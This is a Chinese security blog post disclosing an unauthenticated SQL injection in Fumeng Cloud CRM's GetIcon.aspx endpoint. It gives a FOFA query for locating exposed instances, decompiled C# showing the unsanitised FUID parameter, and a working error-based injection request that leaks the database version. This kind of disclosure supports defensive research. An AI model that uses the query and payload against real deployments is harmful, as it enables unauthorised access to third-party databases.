---
title: "孚盟云CRM GetIcon.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-geticon-fuid-sqli.html
asset_dir: assets/孚盟云crm-geticon.aspx-sql注入漏洞
---

# 孚盟云CRM GetIcon.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/12 13:20
* 1042浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

客户关系管理

鉴权

SaaS


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetIcon.aspx接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `Common/GetIcon.aspx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 `GetIcon` 方法的实现如下

```
public class GetIcon : Page
{
  private DbHelperSql dbHelper = new DbHelperSql(UserCookie.GetCookieValue("corpId"));
  protected HtmlForm form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    string str1 = this.Request.QueryString["FUID"];
    if (str1 == null || !string.op_Inequality(str1, ""))
      return;
    DataTable table = this.dbHelper.Query($"select * from dcFile where FUID='{str1}'").Tables[0];
    string str2 = table.Rows[0]["FileType"].ToString();
```

深入探索

安全运维咨询

编程语言教程

Web安全书籍

未经过滤或参数化绑定的参数 `FUID` 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM GetIcon.aspx SQL注入漏洞](images/img-001-c8124439ad51.webp)](https://image.mrxn.net/f0dfeacb593f467bad6cefc77fa39fc5.webp)

通过报错注入，成功在响应里回显出数据库版本信息。

SQL注入防护

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM GetIcon.aspx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-geticon-fuid-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-geticon-fuid-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-geticon-fuid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-geticon-fuid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 